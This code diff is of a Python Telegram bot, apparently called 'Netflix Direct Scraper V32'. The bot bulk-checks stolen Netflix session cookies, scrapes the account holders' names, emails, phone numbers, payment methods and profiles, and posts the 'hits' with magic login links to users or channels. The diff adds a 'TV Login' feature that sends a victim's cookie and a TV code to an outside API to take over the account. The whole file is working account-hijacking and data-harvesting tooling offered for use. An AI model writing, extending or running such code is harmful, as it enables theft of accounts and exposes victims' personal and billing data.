@@ -17,6 +17,7 @@ from telebot import types
 from datetime import datetime, timedelta
 import urllib3
 from flask import Flask
+
 try:
     from colorama import Fore, Style, init
     init(autoreset=True)
@@ -47,27 +48,17 @@ def keep_alive():
     t.start()
 
 HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "Accept-Encoding": "gzip, deflate, br",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.9",
     "Connection": "keep-alive",
     "Upgrade-Insecure-Requests": "1",
-    "Sec-Fetch-Dest": "document",
-    "Sec-Fetch-Mode": "navigate",
-    "Sec-Fetch-Site": "none",
-    "Sec-Fetch-User": "?1",
-    "Sec-Ch-Ua": '"Chromium";v="142", "Google Chrome";v="142", "Not-A.Brand";v="99"',
-    "Sec-Ch-Ua-Mobile": "?0",
-    "Sec-Ch-Ua-Platform": '"Windows"',
     "Referer": "https://www.netflix.com/",
     "Origin": "https://www.netflix.com",
-    "Pragma": "no-cache",
-    "Cache-Control": "no-cache",
 }
 
-# --- REPLACED KAMALXD WITH YOUR NEW NFTGEN API ---
-API_URL = "http://nftgenapi.onrender.com/api/gen"
+# --- NFTGEN API BASE SETUP ---
+API_BASE_URL = "http://nftgenapi.onrender.com/api"
 SECRET_KEY = "KUROSAKI_YtkX2SnPDdtn0jU9fVyE0iSIGnjPaYIO"
 
 CURRENCY_MAP = {"US": "$", "GB": "£", "IN": "₹", "CA": "C$", "AU": "A$", "BR": "R$", "MX": "Mex$", "TR": "₺", "ES": "€", "FR": "€", "DE": "€", "IT": "€", "NL": "€", "PL": "zł", "AR": "ARS$", "CO": "COP$", "CL": "CLP$", "PE": "S/", "JP": "¥", "KR": "₩", "TW": "NT$", "ZA": "R", "NG": "₦", "KE": "KSh", "EG": "E£", "SA": "SAR", "AE": "AED", "PK": "Rs", "ID": "Rp", "MY": "RM", "PH": "₱", "VN": "₫", "TH": "฿", "SG": "S$", "NZ": "NZ$", "HK": "HK$", "CH": "CHF", "SE": "kr", "NO": "kr", "DK": "kr", "RU": "₽", "UA": "₴", "CZ": "Kč", "HU": "Ft", "RO": "lei", "PT": "€", "IE": "€", "BE": "€", "AT": "€", "FI": "€", "GR": "€"}
@@ -104,20 +95,16 @@ def calculate_duration(member_since_str):
     except: return ""
 
 def extract_deep_details(html):
-    details = {"plan": "Unknown", "payment": "Unknown", "expiry": "N/A", "email": "N/A", "phone": "N/A", "country": "Unknown", "currency": "", "price": "N/A", "quality": "Unknown", "name": "Unknown", "extra_members": "Unknown", "member_since": "Unknown", "max_streams": "Unknown", "profiles": [], "is_dvd": False, "auto_renew": "Off ❌", "has_ads": "No", "has_pins": False, "status": "Unknown", "email_verified": "Unknown", "phone_verified": "Unknown"}
+    details = {"plan": "Unknown", "payment": "Unknown", "expiry": "N/A", "email": "N/A", "phone": "N/A", "country": "Unknown", "currency": "", "price": "N/A", "quality": "Unknown", "name": "Unknown", "extra_members": "Unknown", "member_since": "Unknown", "max_streams": "Unknown", "profiles": [], "status": "Unknown", "email_verified": "Unknown", "phone_verified": "Unknown"}
     
     if '"membershipStatus":"CURRENT_MEMBER"' in html or '"CURRENT_MEMBER":true' in html: details["status"] = "Active"
     elif '"membershipStatus":"FORMER_MEMBER"' in html or '"FORMER_MEMBER":true' in html: details["status"] = "Expired"
     elif '"membershipStatus":"NEVER_MEMBER"' in html or '"NEVER_MEMBER":true' in html: details["status"] = "Free/Never Paid"
     
-    if '"isProfileLocked":true' in html: details["has_pins"] = True
-    
     plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html)
     if plan_match: details["plan"] = clean_text(plan_match.group(1))
     elif re.search(r'"currentPlanName":"([^"]+)"', html): details["plan"] = clean_text(re.search(r'"currentPlanName":"([^"]+)"', html).group(1))
     elif re.search(r'data-uia="plan-label">([^<]+)<', html): details["plan"] = clean_text(re.search(r'data-uia="plan-label">([^<]+)<', html).group(1))
-    
-    if "with ads" in str(details["plan"]).lower(): details["has_ads"] = "Yes"
 
     qual_match = re.search(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html)
     if qual_match: details["quality"] = clean_text(qual_match.group(1))
@@ -126,11 +113,7 @@ def extract_deep_details(html):
         if "premium" in plan_lower: details["quality"] = "UHD 4K"
         elif "standard" in plan_lower: details["quality"] = "Full HD"
         elif "basic" in plan_lower: details["quality"] = "HD"
-        elif "mobile" in plan_lower: details["quality"] = "SD (Mobile)"
     
-    streams_match = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html)
-    if streams_match: details["max_streams"] = streams_match.group(1)
-
     price_match = re.search(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html)
     if price_match: details["price"] = clean_text(price_match.group(1))
     else:
@@ -143,14 +126,10 @@ def extract_deep_details(html):
         if "Visa" in html: details["payment"] = "Visa 💳"
         elif "MasterCard" in html or "Mastercard" in html: details["payment"] = "MasterCard 💳"
         elif "PayPal" in html: details["payment"] = "PayPal 🅿️"
-        elif "Amex" in html: details["payment"] = "Amex 💳"
-        elif "DCB" in html: details["payment"] = "Mobile Bill (DCB) 📱"
     
     name_match = re.search(r'"userContext":\{"name":"([^"]+)"', html)
     if name_match: details["name"] = clean_text(name_match.group(1))
     elif re.search(r'"firstName":"([^"]+)"', html): details["name"] = clean_text(re.search(r'"firstName":"([^"]+)"', html).group(1))
-    elif re.search(r'data-uia="account-owner-name">([^<]+)<', html): details["name"] = clean_text(re.search(r'data-uia="account-owner-name">([^<]+)<', html).group(1))
-    elif re.search(r'"accountOwnerName":"([^"]+)"', html): details["name"] = clean_text(re.search(r'"accountOwnerName":"([^"]+)"', html).group(1))
     
     email_match = re.search(r'"email":"([^"]+)"', html)
     if email_match: details["email"] = clean_text(email_match.group(1))
@@ -160,31 +139,20 @@ def extract_deep_details(html):
         else:
             login_id_match = re.search(r'"userLoginId":"([^"]+)"', html)
             if login_id_match: details["email"] = clean_text(login_id_match.group(1))
-            elif re.search(r'data-uia="account-email">([^<]+)<', html): details["email"] = clean_text(re.search(r'data-uia="account-email">([^<]+)<', html).group(1))
-            elif re.search(r'"emailAddress":"([^"]+)"', html): details["email"] = clean_text(re.search(r'"emailAddress":"([^"]+)"', html).group(1))
-            elif re.search(r'"memberEmail":"([^"]+)"', html): details["email"] = clean_text(re.search(r'"memberEmail":"([^"]+)"', html).group(1))
-            elif re.search(r'"userEmail":"([^"]+)"', html): details["email"] = clean_text(re.search(r'"userEmail":"([^"]+)"', html).group(1))
 
     if '"isEmailVerified":true' in html: details["email_verified"] = "Yes ✅"
     elif '"isEmailVerified":false' in html: details["email_verified"] = "No ❌"
 
-    if details["phone"] != "N/A": details["phone_verified"] = "Yes ✅"
-    
     phone_match = re.search(r'"phoneNumberDigits":\{"__typename":"GrowthClearStringValue","value":"([^"]+)"\}', html)
     if phone_match: details["phone"] = clean_text(phone_match.group(1))
     
     bill_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html)
-    if bill_match:
-        details["expiry"] = clean_text(bill_match.group(1))
-        details["auto_renew"] = "On ✅"
+    if bill_match: details["expiry"] = clean_text(bill_match.group(1))
     
     since_match = re.search(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
     if since_match:
         details["member_since"] = unix_to_date(since_match.group(1))
         details["member_duration"] = calculate_duration(details["member_since"])
-    elif "memberSince" in html:
-         ms_ui = re.search(r'data-uia="member-since">.*?Member Since ([^<]+)', html)
-         if ms_ui: details["member_since"] = clean_text(ms_ui.group(1))
     
     country_match = re.search(r'"currentCountry":"([^"]+)"', html)
     if country_match: details["country"] = country_match.group(1)
@@ -195,7 +163,6 @@ def extract_deep_details(html):
 
     details["profiles"] = []
     p1 = re.findall(r'\{[^}]*?"name":"([^"]+)"[^}]*?"isProfileLocked":(true|false)[^}]*?"isKids":(true|false)[^}]*?\}', html)
-    
     if p1:
         for name, locked, kids in p1:
             status = "🔒" if locked == "true" else "🔓"
@@ -205,28 +172,16 @@ def extract_deep_details(html):
         simple_names = re.findall(r'"profileName":"([^"]+)"', html)
         for name in list(set(simple_names)): details["profiles"].append(f"{clean_text(name)}")
 
-    if not details["profiles"]:
-        ui_profiles = re.findall(r'class="profile-name">([^<]+)<', html)
-        if ui_profiles: details["profiles"] = [clean_text(p) for p in ui_profiles]
-
     if details["name"] == "Unknown" and details["profiles"]: details["name"] = details["profiles"][0].split(' ')[0]
 
     return details
 
-def get_magic_link_api(netflix_id):
+# --- API HELPER FUNCTION (Handles both Gen & TV Login) ---
+def call_api(endpoint, payload):
     try:
-        if "NetflixId=" in netflix_id:
-            netflix_id = netflix_id.split("NetflixId=")[1].split(";")[0].strip()
-            
-        payload = {
-            "netflix_id": netflix_id,
-            "secret_key": SECRET_KEY
-        }
-        headers = {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0"
-        }
-        resp = requests.post(API_URL, json=payload, headers=headers, timeout=15)
+        payload["secret_key"] = SECRET_KEY
+        headers = {"Content-Type": "application/json"}
+        resp = requests.post(f"{API_BASE_URL}/{endpoint}", json=payload, headers=headers, timeout=15)
         return resp.json()
     except Exception as e:
         pass 
@@ -272,7 +227,7 @@ def check_cookie(cookie_input):
     api_response = None
     api_link = None
     if netflix_id_val:
-        api_response = get_magic_link_api(netflix_id_val)
+        api_response = call_api("gen", {"netflix_id": netflix_id_val})
         if api_response and api_response.get("success"):
             api_link = api_response.get("login_url")
 
@@ -284,7 +239,6 @@ def check_cookie(cookie_input):
         for c in playwright_cookies: session.cookies.set(c['name'], c['value'], domain=c['domain'])
 
         resp = session.get("https://www.netflix.com/browse", timeout=10, allow_redirects=False)
-        
         if resp.status_code == 302 and "login" in resp.headers.get("Location", ""): return {"valid": False, "msg": "Redirected to Login (Dead)"}
         if resp.status_code == 200 and "login" in resp.url: return {"valid": False, "msg": "Redirected to Login (Dead)"}
 
@@ -342,8 +296,6 @@ def main():
 
     bot = telebot.TeleBot(BOT_TOKEN)
     telebot.apihelper.RETRY_ON_ERROR = True 
-    print(f"\n{Fore.GREEN}[+] Bot Started! Send cookies to your bot now.{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}[!] NOTE: If you see 'Conflict' errors, STOP the bot on your PC/Laptop!{Style.RESET_ALL}")
 
     user_db = set()
     user_lock = threading.Lock()
@@ -384,9 +336,9 @@ def main():
             
         kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
         kb.add("📩 Send Here (DM)", "📡 Send to Channel")
-        kb.add("🛑 Stop System")
+        kb.add("📺 TV Login", "🛑 Stop System")
         
-        welcome_msg = ("**🔥 Netflix Direct Scraper V32**\n\n👋 **Welcome!** Here is how to use this bot:\n\n1️⃣ **Select a Mode** using the buttons below.\n2️⃣ **Send your Netflix Cookies** (Text or File).\n\n🍪 **Supported Format:**\n• `NetflixId=v2...`\n\n📝 **Example:**\n`NetflixId=v2.CT...`\n\n👇 **Select Mode to Begin:**")
+        welcome_msg = ("**🔥 Netflix Direct Scraper V32**\n\n👋 **Welcome!** Select Mode to Begin:")
         bot.send_message(message.chat.id, welcome_msg, reply_markup=kb, parse_mode='Markdown')
 
     @bot.callback_query_handler(func=lambda call: call.data == "verify_join")
@@ -395,9 +347,39 @@ def main():
             bot.delete_message(call.message.chat.id, call.message.message_id)
             kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
             kb.add("📩 Send Here (DM)", "📡 Send to Channel")
-            kb.add("🛑 Stop System")
+            kb.add("📺 TV Login", "🛑 Stop System")
             bot.send_message(call.message.chat.id, "**✅ Verified!**\n**🔥 Netflix Direct Scraper V32**\nSelect Mode:", reply_markup=kb, parse_mode='Markdown')
         else: bot.answer_callback_query(call.id, "❌ You haven't joined all channels yet!", show_alert=True)
+
+    # --- NEW TV LOGIN FEATURE ---
+    @bot.message_handler(func=lambda m: m.text == "📺 TV Login")
+    def tv_login_start(message):
+        msg = bot.reply_to(message, "📺 **TV Login Mode Activated**\n\n1️⃣ Please send your **Netflix Cookie** first.")
+        bot.register_next_step_handler(msg, process_tv_cookie)
+
+    def process_tv_cookie(message):
+        cookie = message.text.strip()
+        
+        nid_match = re.search(r"NetflixId=([^;]+)", cookie)
+        netflix_id_val = nid_match.group(1) if nid_match else cookie
+        
+        if len(netflix_id_val) < 50:
+            return bot.reply_to(message, "❌ Invalid Cookie length. Try again by clicking '📺 TV Login'.")
+
+        msg = bot.reply_to(message, "✅ **Cookie Validated!**\n\n2️⃣ Now enter the **8-Digit TV Code** shown on your TV screen.")
+        bot.register_next_step_handler(msg, lambda m: execute_tv_login(m, netflix_id_val))
+
+    def execute_tv_login(message, netflix_id):
+        tv_code = message.text.strip()
+        bot.reply_to(message, "⏳ **Processing TV Login...** Please wait.")
+        
+        res = call_api("tvlogin", {"netflix_id": netflix_id, "tv_code": tv_code})
+        
+        if res and res.get("success"):
+            bot.reply_to(message, f"✅ **TV Login Successful!** 🎉\n\n**Status:** {res.get('message', 'Logged in to TV')}\nEnjoy watching Netflix!")
+        else:
+            err = res.get("message", "Unknown Error / API Offline") if res else "API is unreachable right now."
+            bot.reply_to(message, f"❌ **TV Login Failed!**\n\n**Reason:** {err}")
 
     @bot.message_handler(commands=['users', 'stats'])
     def user_stats(message):
@@ -405,4 +387,210 @@ def main():
         try:
             count = 0
             if os.path.exists(USERS_FILE):
-                with open(USERS_FILE, "r") as f: count = len(f.read().s
+                with open(USERS_FILE, "r") as f: count = len(f.read().splitlines())
+            bot.reply_to(message, f"📊 **Total Users:** {count}")
+        except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
+
+    @bot.message_handler(commands=['broadcast'])
+    def broadcast(message):
+        if message.chat.id != ADMIN_ID: return
+        msg = bot.reply_to(message, "📝 **Send the message (Text, Image, File) to broadcast:**")
+        bot.register_next_step_handler(msg, perform_broadcast)
+
+    def perform_broadcast(message):
+        try:
+            if not os.path.exists(USERS_FILE): return bot.reply_to(message, "❌ No users found.")
+            with open(USERS_FILE, "r") as f: users = f.read().splitlines()
+            count = 0
+            for uid in users:
+                try:
+                    if message.content_type == 'text': bot.send_message(uid, message.text)
+                    elif message.content_type == 'photo': bot.send_photo(uid, message.photo[-1].file_id, caption=message.caption)
+                    elif message.content_type == 'document': bot.send_document(uid, message.document.file_id, caption=message.caption)
+                    count += 1
+                except: pass
+            bot.reply_to(message, f"✅ **Broadcast sent to {count} users.**")
+        except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
+
+    @bot.message_handler(func=lambda m: m.text == "🛑 Stop System")
+    def stop_sys(message):
+        if message.chat.id in user_modes: user_modes[message.chat.id]['stop'] = True
+        else: user_modes[message.chat.id] = {'stop': True}
+        bot.reply_to(message, "**🛑 Scanning Stopped.**", parse_mode='Markdown')
+
+    @bot.message_handler(func=lambda m: m.text == "📩 Send Here (DM)")
+    def mode_dm(message):
+        user_modes[message.chat.id] = {'target': message.chat.id, 'stop': False}
+        bot.reply_to(message, "**✅ DM Mode Active.** Send file or text now.", parse_mode='Markdown')
+
+    @bot.message_handler(func=lambda m: m.text == "📡 Send to Channel")
+    def mode_ch(message):
+        msg = bot.reply_to(message, "**📡 Enter Channel ID** (e.g., -100xxxx):", parse_mode='Markdown')
+        bot.register_next_step_handler(msg, save_ch)
+
+    def save_ch(message):
+        try:
+            chat_id = int(message.text.strip())
+            user_modes[message.chat.id] = {'target': chat_id, 'stop': False}
+            bot.reply_to(message, "**✅ Channel Verified.** Hits will be sent there.", parse_mode='Markdown')
+        except: bot.reply_to(message, "❌ Invalid ID.")
+
+    @bot.message_handler(content_types=['document', 'text'])
+    def handle_input(message):
+        uid = message.chat.id
+        save_user(uid) 
+        if not check_sub(uid): return send_force_join(uid)
+            
+        mode = user_modes.get(uid)
+        
+        if message.text and (message.text.startswith("/") or message.text in ["📩 Send Here (DM)", "📡 Send to Channel", "📺 TV Login", "🛑 Stop System"]): return
+        
+        if not mode: return bot.reply_to(message, "❌ **Select a mode first!**", parse_mode='Markdown')
+        if mode.get('stop'): return bot.reply_to(message, "🛑 **System is stopped.**\nClick a Mode button to resume.")
+
+        cookies = []
+        try:
+            if message.content_type == 'document':
+                file_info = bot.get_file(message.document.file_id)
+                downloaded_file = bot.download_file(file_info.file_path)
+                
+                if message.document.file_name.endswith('.zip'):
+                    with zipfile.ZipFile(io.BytesIO(downloaded_file)) as z:
+                        for filename in z.namelist():
+                            if filename.endswith('.txt'):
+                                with z.open(filename) as f: cookies.extend(f.read().decode('utf-8', errors='ignore').splitlines())
+                else: cookies = downloaded_file.decode('utf-8', errors='ignore').splitlines()
+            else: cookies = message.text.splitlines()
+            
+            valid_cookies = [c.strip() for c in cookies if len(c.strip()) > 50 and ("NetflixId" in c or "netflix" in c.lower() or "=" in c)]
+            
+            if not valid_cookies: return bot.reply_to(message, "❌ **No Valid Cookies Found!**", parse_mode='Markdown')
+
+            bot.reply_to(message, f"🚀 **Checking {len(valid_cookies)} Cookies...**\n_Task started in background._", parse_mode='Markdown')
+            
+            def background_checker(cookies, chat_id, target):
+                valid_count = 0
+                hits_list = [] 
+
+                def process_cookie(cookie):
+                    if user_modes.get(chat_id, {}).get('stop'): return None
+                    try:
+                        res = check_cookie(cookie)
+                        if res["valid"]:
+                            send_hit(target, res, cookie)
+                            return (res, cookie) 
+                    except: pass
+                    return None
+
+                with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
+                    futures = [executor.submit(process_cookie, c) for c in cookies]
+                    for future in concurrent.futures.as_completed(futures):
+                        if user_modes.get(chat_id, {}).get('stop'): break
+                        result = future.result()
+                        if result:
+                            valid_count += 1
+                            hits_list.append(result)
+                
+                if hits_list:
+                    try:
+                        summary = f"========================================\nNETFLIX HITS SUMMARY\nAdmin: https://t.me/F88UF\nChannel: https://t.me/F88UF9844\n========================================\n\n"
+                        for res, cookie in hits_list:
+                            data = res.get("data", {})
+                            summary += f"Country: {res.get('country', 'Unknown')}\n"
+                            summary += f"Email: {data.get('email', 'N/A')}\n"
+                            summary += f"Plan: {data.get('plan', 'N/A')}\n"
+                            summary += f"Login: {res.get('magic_link', 'N/A')}\n"
+                            summary += f"Cookie: {cookie}\n"
+                            summary += "-"*40 + "\n"
+                        summary += "\n========================================\nJoin Channel: https://t.me/F88UF9844\n========================================"
+                        
+                        with io.BytesIO(summary.encode('utf-8')) as f:
+                            f.name = f"Netflix_Hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+                            bot.send_document(chat_id, f, caption="📂 **Here is your Hits Summary File**")
+                    except Exception as e: pass
+
+                try: bot.send_message(chat_id, f"✅ **Check Complete.** Hits: {valid_count}", parse_mode="Markdown")
+                except: pass
+
+            threading.Thread(target=background_checker, args=(valid_cookies, uid, mode['target'])).start()
+
+        except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
+
+    def send_hit(chat_id, res, cookie):
+        data = res.get("data", {})
+        
+        def esc(t): return str(t).replace("_", "\\_").replace("*", "\\*").replace("`", "\\`")
+
+        country_code = res.get('country', 'Unknown')
+        flag = get_flag(country_code)
+        currency_sym = get_currency_symbol(country_code)
+        
+        price = data.get('price', 'Unknown')
+        if price != 'Unknown' and currency_sym not in price: price = f"{currency_sym} {price}"
+        
+        markup = types.InlineKeyboardMarkup()
+        login_url = res.get('magic_link', 'Token Not Found')
+        
+        if login_url and "http" in login_url and login_url != "Token Not Found":
+            btn_login = types.InlineKeyboardButton("🔗 Login (Magic Link)", url=login_url)
+            markup.add(btn_login)
+        else: login_url = "https://www.netflix.com/login" 
+        
+        lines = []
+        lines.append("🌟 **NETFLIX PREMIUM ULTRA HIT** 🌟")
+        lines.append("")
+        lines.append(f"🟢 **STATUS:** Active ✅")
+        
+        # --- ENHANCED COUNTRY FLAG FEATURE ---
+        if country_code != "Unknown": lines.append(f"🌍 **REGION:** {esc(country_code)} {flag}")
+            
+        if data.get('member_since') and data['member_since'] != "Unknown":
+            duration = data.get('member_duration', '')
+            lines.append(f"⏰ **MEMBER SINCE:** {esc(data['member_since'])} {esc(duration)}")
+        
+        lines.append(f"👤 **OWNER:** {esc(data.get('name', 'Unknown'))}")
+        lines.append(f"👑 **PLAN:** {esc(data.get('plan', 'Premium'))}")
+        if price != "Unknown" and price != "N/A": lines.append(f"💰 **PRICE:** {esc(price)}")
+        
+        payment_info = data.get('payment', 'Unknown')
+        lines.append(f"💳 **PAYMENT:** {esc(payment_info)}")
+        
+        if data.get('expiry') and data['expiry'] != "N/A": lines.append(f"📅 **NEXT BILLING:** {esc(data['expiry'])}")
+            
+        if data.get('profiles'):
+            profile_str = ", ".join(data['profiles'])
+            lines.append(f"🎭 **PROFILES:** {esc(profile_str)}")
+            
+        lines.append(f"📧 **EMAIL:** {esc(data.get('email', 'N/A'))}")
+        if data.get('email_verified') != "Unknown": lines.append(f"   └ {esc(data['email_verified'])} Verified")
+            
+        lines.append(f"☎️ **PHONE:** {esc(data.get('phone', 'N/A'))}")
+        lines.append(f"👥 **EXTRA MEMBERS:** {esc(data.get('extra_members', 'No ❌'))}")
+        lines.append("")
+        lines.append(f"💜 [CLICK HERE TO LOGIN]({login_url}) 💜")
+        lines.append("")
+        lines.append("━━━━━━━━━━━━━━━━━━━━━━")
+        lines.append("👨‍💻 **Admin:** [Message Me](https://t.me/F88UF) | 📢 **Channel:** [Join Here](https://t.me/F88UF9844)")
+        
+        msg = "\n".join(lines)
+        
+        if res.get('screenshot'):
+            try:
+                img = io.BytesIO(res['screenshot'])
+                img.name = 'screenshot.jpg' 
+                bot.send_photo(chat_id, img, caption=msg, parse_mode="Markdown", reply_markup=markup)
+            except Exception as e:
+                bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=markup, disable_web_page_preview=True)
+                try:
+                    img.seek(0)
+                    bot.send_photo(chat_id, img, caption="Screenshot (Caption failed)")
+                except: pass
+        else: bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=markup, disable_web_page_preview=True)
+
+    while True:
+        try: bot.infinity_polling(timeout=90, long_polling_timeout=60, skip_pending=True)
+        except Exception as e:
+            if "409" in str(e): time.sleep(15)
+            else: time.sleep(5)
+
+if __name__ == "__main__": main()
